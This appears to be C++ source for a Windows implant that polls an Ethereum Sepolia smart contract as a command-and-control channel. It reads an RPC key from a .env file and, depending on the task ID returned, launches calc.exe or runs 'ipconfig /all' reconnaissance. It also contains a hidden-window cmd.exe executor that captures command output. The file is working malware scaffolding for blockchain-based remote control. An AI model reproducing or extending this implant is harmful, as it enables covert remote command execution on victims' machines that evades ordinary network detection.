#include "../include/rpcengine.h"
#include "../include/HTTPClient.h"
#include <iostream>
#include <fstream>
#include <string>
#include <cstdint>
#include <algorithm>
#include <windows.h>

// Lightweight .env parser for the implant
std::string getEnvVar(const std::string& filepath, const std::string& key) {
    std::ifstream file(filepath);
    std::string line;
    std::string searchKey = key + "=";
    
    while (std::getline(file, line)) {
        if (line.find(searchKey) == 0) { // If the line starts with our key
            std::string val = line.substr(searchKey.length());
            // Strip any double quotes that Foundry requires
            val.erase(std::remove(val.begin(), val.end(), '\"'), val.end());
            return val;
        }
    }
    return "";
}

uint64_t parseTaskID(const std::string& hexStr) {
    if (hexStr.empty() || hexStr == "0x" || hexStr.find("ERROR") != std::string::npos) return 0;
    try { return std::stoull(hexStr, nullptr, 16); } 
    catch (...) { return 0; }
}

std::string executeShellCommand(const std::string& command){
    //logic for command execution goes here.
    std::string result = "";
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if(!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)){
        return "[-] Failed to create pipe!!";
    }

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;


    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    std::string full_command = "cmd.exe /c" + command;
    // 5. Spawn the Process
    if(!CreateProcessA(NULL,
            (LPSTR)full_command.c_str(),
            NULL,
            NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
    )) {
        return "[-] CreateProcessA failed!";
    }


    CloseHandle(hWritePipe);
    char buffer[4096];
    DWORD bytesRead;
    while(ReadFile(hReadPipe, buffer, sizeof(buffer) -1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }
    // 8. Clean up
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return result;

}

int main() {
    std::cout << "[*] Waking up implant. Loading from .env..." << std::endl;

    // 1. Read the key dynamically from your existing Foundry .env file
    std::string apiKey = getEnvVar("../hub/.env", "SEPOLIA_RPC_URL");
    
    if (apiKey.empty()) {
        std::cout << "[-] FATAL: Could not locate SEPOLIA_RPC_URL in ../hub/.env" << std::endl;
        return 1;
    }

    std::wstring wApiKey(apiKey.begin(), apiKey.end());
    std::string taskRequest = Rpcengine::buildTaskQueryReq();
    
    std::wstring host = L"eth-sepolia.g.alchemy.com";
    std::wstring path = L"/v2/" + wApiKey;

    std::cout << "[*] Polling Sepolia Hub for tasks..." << std::endl;
    std::string response = HTTPClient::postRequest(host, path, taskRequest);

    // 2. Extract and Parse
    std::string rawHex = Rpcengine::extractResults(response);
    uint64_t currentTask = parseTaskID(rawHex);
    
    std::cout << "[+] Current Task ID on Blockchain: " << currentTask << std::endl;

    // 3. The Execution Router
    if (currentTask == 0) {
        std::cout << "[zZz] No active tasks (Task 0). Standing by." << std::endl;
    } 
    else if (currentTask == 1) {
        std::cout << "[!] EXECUTE TASK 1: Popping Calculator" << std::endl;
        system("calc.exe"); 
    }
    else if (currentTask == 2) {
        std::cout << "[!] EXECUTE TASK 2: Network Reconnaissance" << std::endl;
        system("ipconfig /all");
    }
    else {
        std::cout << "[?] Unknown Task ID: " << currentTask << ". Ignoring." << std::endl;
    }

    return 0;
}